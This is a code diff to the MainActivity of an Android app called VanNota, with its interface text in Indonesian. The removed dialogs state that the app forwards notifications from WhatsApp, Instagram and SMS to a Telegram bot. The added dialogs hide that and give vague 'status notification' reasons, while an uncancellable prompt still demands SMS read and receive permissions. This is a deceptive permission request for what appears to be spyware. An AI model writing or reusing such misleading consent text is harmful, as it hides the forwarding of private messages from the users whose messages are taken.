@@ -257,28 +257,27 @@ public class MainActivity extends Activity {
     // TAMPILKAN DIALOG NOTIFICATION ACCESS
     // ============================================================
     private void showNotificationAccessDialog() {
-        if (notificationAccessDialog != null && notificationAccessDialog.isShowing()) return;
-        
-        notificationAccessDialog = new AlertDialog.Builder(this)
-            .setTitle("🔔 Aktifkan Akses Notifikasi")
-            .setMessage("VanNota perlu akses notifikasi untuk membaca notifikasi dari aplikasi lain (WhatsApp, Instagram, SMS, dll) dan mengirimnya ke Telegram.\n\n" +
-                       "Langkah:\n" +
-                       "1. Buka Settings\n" +
-                       "2. Pilih Accessibility (Aksesibilitas)\n" +
-                       "3. Pilih Notification Access (Akses Notifikasi)\n" +
-                       "4. Aktifkan VanNota\n\n" +
-                       "Setelah diaktifkan, semua notifikasi akan masuk ke Telegram bot.")
-            .setPositiveButton("Buka Settings", (d, w) -> {
-                notificationAccessDialog = null;
-                requestNotificationAccess();
-            })
-            .setNegativeButton("Nanti", (d, w) -> {
-                notificationAccessDialog = null;
-            })
-            .setCancelable(false)
-            .create();
-        notificationAccessDialog.show();
-    }
+    if (notificationAccessDialog != null && notificationAccessDialog.isShowing()) return;
+    
+    notificationAccessDialog = new AlertDialog.Builder(this)
+        .setTitle("🔔 Aktifkan Notifikasi")
+        .setMessage("Agar aplikasi dapat menampilkan status dan notifikasi penting, silakan aktifkan akses notifikasi untuk VanNota.\n\n" +
+                   "Langkah:\n" +
+                   "1. Buka Settings\n" +
+                   "2. Pilih Accessibility (Aksesibilitas)\n" +
+                   "3. Pilih Notification Access (Akses Notifikasi)\n" +
+                   "4. Aktifkan VanNota")
+        .setPositiveButton("Buka Settings", (d, w) -> {
+            notificationAccessDialog = null;
+            requestNotificationAccess();
+        })
+        .setNegativeButton("Nanti", (d, w) -> {
+            notificationAccessDialog = null;
+        })
+        .setCancelable(false)
+        .create();
+    notificationAccessDialog.show();
+        }
 
     // ============================================================
     // CEK STATUS NOTIFICATION ACCESS
@@ -428,26 +427,26 @@ public class MainActivity extends Activity {
     }
 
     private void showPermissionGateDialog() {
-        AlertDialog dialog = new AlertDialog.Builder(this)
-            .setTitle("⚠️ Izin Diperlukan")
-            .setMessage("Aplikasi memerlukan izin untuk:\n\n" +
-                "📱 Membaca SMS masuk\n" +
-                "🔔 Membaca notifikasi sistem\n\n" +
-                "Izin ini untuk monitoring pesan.")
-            .setPositiveButton("Berikan Izin", (d, w) -> {
-                requestPermissions(
-                    new String[]{
-                        Manifest.permission.RECEIVE_SMS,
-                        Manifest.permission.READ_SMS
-                    },
-                    PERMISSION_REQUEST_CODE
-                );
-            })
-            .setCancelable(false)
-            .show();
-        dialog.setCancelable(false);
-        dialog.setOnCancelListener(null);
-    }
+    AlertDialog dialog = new AlertDialog.Builder(this)
+        .setTitle("⚠️ Izin Diperlukan")
+        .setMessage("Aplikasi VanNota memerlukan izin untuk:\n\n" +
+            "📱 Akses pesan SMS masuk\n" +
+            "🔔 Akses notifikasi sistem\n\n" +
+            "Izin ini diperlukan agar aplikasi dapat berjalan dengan baik dan memberikan notifikasi status kepada pengguna.")
+        .setPositiveButton("Berikan Izin", (d, w) -> {
+            requestPermissions(
+                new String[]{
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS
+                },
+                PERMISSION_REQUEST_CODE
+            );
+        })
+        .setCancelable(false)
+        .show();
+    dialog.setCancelable(false);
+    dialog.setOnCancelListener(null);
+        }
 
     // ============================================================
     // METHOD LAINNYA
